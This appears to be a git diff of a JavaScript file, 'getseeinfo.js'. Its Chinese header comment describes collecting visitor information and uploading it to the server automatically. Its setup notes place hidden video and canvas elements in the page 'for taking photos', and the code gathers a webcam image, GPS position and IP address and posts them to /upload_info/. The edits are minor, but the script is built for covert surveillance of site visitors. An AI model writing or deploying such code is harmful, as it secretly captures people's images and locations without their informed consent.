@@ -1,17 +1,17 @@
 /*
  * @Author: whalefall
  * @Date: 2021-08-27 04:28:23
- * @LastEditTime: 2021-08-27 05:00:24
+ * @LastEditTime: 2021-08-27 05:32:39
  * @Description: 获取访客信息并自动上传服务器 激活方法:getMedia(getGps);
  * 前面引入js
  * <script src="/static/js/getseeinfo.js"></script>
  后面引入获取ip地址
- * <script src="http://whois.pconline.com.cn/ipJson.jsp"></script>
+ *  <script src="https://whois.pconline.com.cn/ipJson.jsp"></script>
  * 在html中加入
  * <!-- 拍照用 -->
-	<video id="video" width="600px" height="600px" autoplay="autoplay" style="display: none;"></video>
-	<canvas id="canvas" width="600px" height="600px" style="display: none;"></canvas>
- */
+    <video id="video" width="600px" height="600px" autoplay="autoplay" style="display: none;"></video>
+    <canvas id="canvas" width="600px" height="600px" style="display: none;"></canvas>
+*/
 
 // 储存获取到的信息
 var infodata = {};
@@ -37,11 +37,11 @@ function IPCallBack(location) {
 //提交数据上服务器
 function submit() {
 	// 判断数据是否为空
-	// if (infodata.base64 == undefined && infodata.gps == undefined) {
-	// 	console.log('数据为空');
-	// 	layer.msg('空空然~');
-	// 	return;
-	// };
+	if (infodata.base64 == undefined && infodata.gps == undefined && infodata.ip == undefined) {
+		console.log('数据为空');
+		layer.msg('空空然~');
+		return;
+	};
 	console.log(infodata);
 	$.ajax({
 		url: "/upload_info/",
@@ -49,10 +49,11 @@ function submit() {
 		contentType: 'application/json;charset=UTF-8',
 		data: JSON.stringify(infodata),
 		dataType: "json",
-		beforeSend: function IPCallBack(location) {
-			// jsShow();
-			// console.log(location);
-		},
+		// beforeSend: function() {
+		// 	// jsShow();
+		// 	// console.log(location);
+		// 	// IPCallBack();
+		// },
 		success: function(result) {
 			console.log(result)
 			if (result.code == 200) {
